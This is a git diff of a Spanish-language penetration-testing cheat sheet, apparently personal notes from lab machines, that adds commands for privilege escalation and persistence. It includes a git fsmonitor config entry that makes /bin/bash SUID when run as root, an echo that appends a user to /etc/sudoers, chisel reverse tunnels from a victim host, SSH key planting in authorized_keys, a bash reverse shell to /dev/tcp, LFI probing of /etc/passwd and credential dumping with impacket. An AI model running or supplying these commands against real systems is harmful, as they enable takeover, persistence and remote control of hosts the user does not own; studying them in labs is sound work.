@@ -17,6 +17,8 @@ git diff commit
 git branch
 git checkout dev --> en el branch te ha salido que habia un dev y estabas en public, asi lo cambias a dev
 
+git/config --> fsmonitor = "chmod +s/4777/4755 /bin/bash" --> fsmonitor --> es un parametro usado para ejecutar comandos de sistema, esto lo metes en un archivo config y por ejemplo si lo ejecuta como root que lo sabes por el pspy te va a dar privilegios de root la proxima vez que se ejecute
+
 ```
 ### BASICS
 ```
@@ -29,6 +31,11 @@ En evilwinrm para descargar un archivo directamente desde mi ordenador UPLOAD ru
 Siempre que ponga file= probar con ../../../../../../etc/passwd (LFI)
 Si se junta LFI y PHP mira a ver si puedes hacer log poison
 find / 2>/dev/null | grep \.txt$  ---> \. -> termina en txt,,  $ -> fin de linea, no hay nada detras del txt
+```
+### SUDOERS
+```
+echo "dev01    ALL=(ALL:ALL) ALL" >> /etc/sudoers   ---> cuando ejecutas algo como root puedes añadirle el usuario dev01 a la lista de sudoers y asi le das privilegios de root
+
 
 ```
 ### WINDOWS
@@ -76,6 +83,12 @@ ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84
 
 ssh -L puertoquequeremosaccederdesdemimaquina:127.0.0.1:puertodelservicio usuario@IP
 ```
+```
+### CHISEL
+```
+./chisel server -p 9999 --reverse ---> nuestra maquina, primero este comando
+./chisel client 10.10.14.4:9999 R:3000:172.17.0.1:3000 ---> maquina victima
+./chisel client 10.10.14.4:9999 R:127.0.0.1:7777:172.17.0.1:3000 ---> localhost:7777
 ```
 ### SSTI
 
@@ -127,6 +140,9 @@ nmap -sS -sU -T4 -A -v 10.10.10.3 (puertos udp)
 solo que no se puede escribir) ejecutamos !/bin/bash y nos saca fuera como si fueramos root
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 cuando no funciona un comando se prueba poniendo bash -c "comando" en este caso ->> bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+
+"chmod +s/4777/4755 /bin/bash" --> chmod +s/... -> le cambia el indicador de usuario y grupo (GID, UID) a root de /bin/bash
+bash -p se usa cuando has añadido chmod +s/4777/4755 para ignorar el GID y UID que tiene por defecto y ejecuta el del propio archivo, habiendolo cambiando antes con chmod +s a root, lo ejecuta como root y te da privilegios de root
 
 REVERSE SHELL MAS POTENTE (Se ejecuta una vez que están dentro de una reverse Shell) ->
 
@@ -217,6 +233,7 @@ impacket-secretsdump -just-dc melanie:Welcome123@10.10.10.169  -outputfile dcsyn
 conectar por SSH ---> ssh user@IP ---> te pide la pass luego
 ssh-keygen -f "user"  ---> crea tu key(llave) ssh-keygen -f "peterolord"
 echo "public key" > /home/susan/.ssh/authorized_keys  ---> mete tu keyn en el fichero del servidor authorizedkey para poder utilizarlo 
+ssh chmod 600 key para darle permisos y que funcione
 ssh -i  peterolord(nombre llave) susan@10.10.11.253   ---> conecta tu maquina con el servidor mediante ssh, si tuvieras la contraseña de susan seria ->>
 ssh -i susan susan@10.10.11.253 --> teniendo la key de susan 
 	nombrekey  user@IPMaquina	
